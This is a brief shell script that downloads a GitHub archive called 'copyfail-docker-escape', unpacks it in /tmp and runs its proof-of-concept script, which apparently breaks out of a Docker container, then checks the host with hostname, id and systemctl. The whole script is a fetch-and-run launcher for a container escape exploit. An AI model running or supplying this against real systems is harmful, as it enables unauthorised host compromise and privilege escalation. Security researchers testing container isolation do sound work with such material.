#!/bin/sh
set -euxo pipefail
curl -L https://github.com/avevad/copyfail-docker-escape/archive/refs/heads/main.tar.gz >/tmp/copyfail-docker-escape.tar.gz
cd /tmp && tar -xf /tmp/copyfail-docker-escape.tar.gz && cd copyfail-docker-escape-main
./poc.sh sh -c 'hostname; id; systemctl status docker'
